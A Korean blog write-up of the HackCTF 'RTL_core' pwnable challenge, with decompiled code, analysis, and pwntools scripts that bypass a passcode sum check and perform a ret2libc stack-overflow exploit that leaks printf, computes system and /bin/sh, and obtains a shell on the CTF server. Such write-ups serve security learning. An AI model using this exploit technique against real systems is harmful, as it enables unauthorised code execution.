---
layout: post
title: "HackCTF RTL_core"
subtitle: "WriteUp"
date: 2021-04-05 17:00
background:
tag: [WriteUp, HackCTF, Pwnable]
---

# RTL_core

### Source

```c
➜  RTLcore git:(master) ✗ checksec --file rtlcore
[*] '/home/ubuntu/CTF/hackctf/pwnable/RTLcore/rtlcore'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```c
ssize_t core()
{
  int buf; // [esp+Ah] [ebp-3Eh] BYREF
  int v2; // [esp+Eh] [ebp-3Ah] BYREF
  int v3; // [esp+38h] [ebp-10h]
  void *v4; // [esp+3Ch] [ebp-Ch]

  buf = 0;
  v2 = 0;
  v3 = 0;
  memset((char *)&v2 + 2, 0, 4 * ((((char *)&v2 - ((char *)&v2 + 2) + 46) & 0xFFFFFFFC) >> 2));
  v4 = dlsym((void *)0xFFFFFFFF, "printf");
  printf(&format, v4);
  return read(0, &buf, 0x64u);
}

int __cdecl check_passcode(int a1)
{
  int v2; // [esp+8h] [ebp-8h]
  int i; // [esp+Ch] [ebp-4h]

  v2 = 0;
  for ( i = 0; i <= 4; ++i )
    v2 += *(_DWORD *)(4 * i + a1);
  return v2;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[24]; // [esp+Ch] [ebp-1Ch] BYREF

  setvbuf(_bss_start, 0, 2, 0);
  puts(&::s);
  printf("Passcode: ");
  gets(s);
  if ( check_passcode((int)s) == hashcode )//hashcode = 3235492007
  {
    puts(&byte_8048840);
    core();
  }
  else
  {
    puts(&byte_8048881);
  }
  return 0;
}
```

### Solve

소스를 간단히 분석하자면 gets로 입력받고 check_passcode함수의 리턴값이 hashcode와 같으면 core()함수를 실행한다.

```c
int __cdecl check_passcode(int a1)
{
  int v2; // [esp+8h] [ebp-8h]
  int i; // [esp+Ch] [ebp-4h]

  v2 = 0;
  for ( i = 0; i <= 4; ++i )
    v2 += *(_DWORD *)(4 * i + a1);
  return v2;
}
```

check_passcode 함수는 입력값을 5번에 나눠서 값을 더한 후 리턴한다. 리턴값이 hashcode와 일치하면 되는데 운좋게도(?) hashcode는 고정되어 있다. 3235492007이며 이것을 5로 나누면 2가 남으므로 2를 빼고 5번 나누고 마지막에 2를 더한다.

```c
from pwn import *

context.arch = 'i386'
context.terminal=['tmux', 'splitw', '-h']
p = process("./rtlcore")
#p = remote('ctf.j0n9hyun.xyz', 3011)
#get_flag = 0x8048f0d
gdb.attach(p, 'b*0x0804867a')

data = 0x2691f021
print p.recvuntil("Passcode: ")

payload = ''
payload += p32(data)*4 + p32(data + 2)
p.sendline(payload)
```

```c
➜  RTLcore git:(master) ✗ python2 rtlcore.py
[+] Starting local process './rtlcore': pid 19211
코어 파일에 액세스중입니다...
패스코드를 입력해주세요
Passcode:
코드가 일치하구나. 좋아, 다음 단서를 던져주지

너에게 필요한 것은 바로 0xf7d8d430 일거야
```

주소하나를 던져주는데 이 주소는 printf의 주소인데 정확히 plt인지 got인지 모르겠다.

그 이후 프로그램은 다음 코드를 진행한다

```c
return read(0, &buf, 100u);
```

이게 의미하는 것은 무엇일까 BOF는 맞는거 같은데...위의 주소를 이용하는 거라면 GOT라고 가정하고 GOT Overwirte일까? 하지만 이 함수 이후 printf가 Call이 되지 않는다. 음... 만약 Offset이라면 offset 만큼 빼서 base를 구하고 system과 ,/bin/sh를 구해서 쉘을 띄운다면?

그럼.... 페이로드를 어떻게 해야할까?

Dummy | system | "AAAA" | /bin/sh" 로 가능하다.

```python
from pwn import *

context.arch = 'i386'
context.terminal=['tmux', 'splitw', '-h']
p = process("./rtlcore")
#e = ELF("./libc.so.6")
#p = remote('ctf.j0n9hyun.xyz', 3011)
#gdb.attach(p, 'b*0x0804867a')
pop3ret = 0x08048681
printf_offset = 0x51430
system_offset = 0x3d2e0
binsh_offset = 0x17e0af
print p.recvuntil("Passcode: ")

payload = ''
payload += p32(0x2691f021)*4 + p32(0x2691f021 + 2)
p.sendline(payload)
print p.recvline()
print p.recv(34)
printf = int(p.recv(10), 16)
print "printf addr : ",hex(printf)
print p.recvuntil("\n")

libc_base = printf - printf_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
print "libc_base : ", hex(libc_base)
print "system_addr : ", hex(system_addr)
print "binsh_addr : ", hex(binsh_addr)
payload = ''
payload += "A"*66
payload += p32(system_addr)
payload += "AAAA"
payload += p32(binsh_addr)

p.sendline(payload)
p.interactive()
```

```python
➜  RTLcore git:(master) ✗ python2 rtlcore.py
[+] Starting local process './rtlcore': pid 21996
코어 파일에 액세스중입니다...
패스코드를 입력해주세요
Passcode:
코드가 일치하구나. 좋아, 다음 단서를 던져주지

너에게 필요한 것은 바로
printf addr :  0xf7df5430
 일거야

libc_base :  0xf7da4000
system_addr :  0xf7de12e0
binsh_addr :  0xf7f220af
[*] Switching to interactive mode
$ ls
core  libc.so.6  rtlcore  rtlcore.py
```

로컬에선 쉘이 떴지만 리모트에선 libc가 다르기 때문에 불가능하다. 근데 문제는 웃긴게 내 aws서버에서 LD_LIBRARY_PATH를 설정하면 바이너리가 뻑난다. 이유가 뭘까...

정확한 이유는 모르겠지만 우분투 버전에서의 차이인가 싶다. 그래서 gdb를 통해 오프셋을 얻고 익스코드를 다시짰다.

```python
from pwn import *

#context.arch = 'i386'
#context.terminal=['tmux', 'splitw', '-h']
#p = process("./rtlcore")
e = ELF("./libc.so.6")
libc = ELF("./libc.so.6")
p = remote('ctf.j0n9hyun.xyz', 3015)
#gdb.attach(p, 'b*0x0804867a')
printf_offset = 0x49020
system_offset = 0x0a940
binsh_offset = 0x15902b
print p.recvuntil("Passcode: ")

payload = ''
payload += p32(0x2691f021)*4 + p32(0x2691f021 + 2)
p.sendline(payload)
print p.recvuntil("0x")
printf = int(p.recv(8), 16)
print "printf addr : ",hex(printf)

libc_base = printf - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + libc.search("/bin/sh").next()
print "libc_base : ", hex(libc_base)
print "system_addr : ", hex(system_addr)
print "binsh_addr : ", hex(binsh_addr)

payload = ''
payload += "A"*66
payload += p32(system_addr)
payload += "AAAA"
payload += p32(binsh_addr)

p.sendline(payload)
p.interactive()
```

```python
➜  RTLcore git:(master) ✗ python2 rtlcore.py
[*] '/home/ubuntu/CTF/hackctf/pwnable/RTLcore/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to ctf.j0n9hyun.xyz on port 3015: Done
코어 파일에 액세스중입니다...
패스코드를 입력해주세요
Passcode:
코드가 일치하구나. 좋아, 다음 단서를 던져주지
너에게 필요한 것은 바로 0x
printf addr :  0xf7e0a020
libc_base :  0xf7dc1000
system_addr :  0xf7dfb940
binsh_addr :  0xf7f1a02b
[*] Switching to interactive mode
 일거야
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```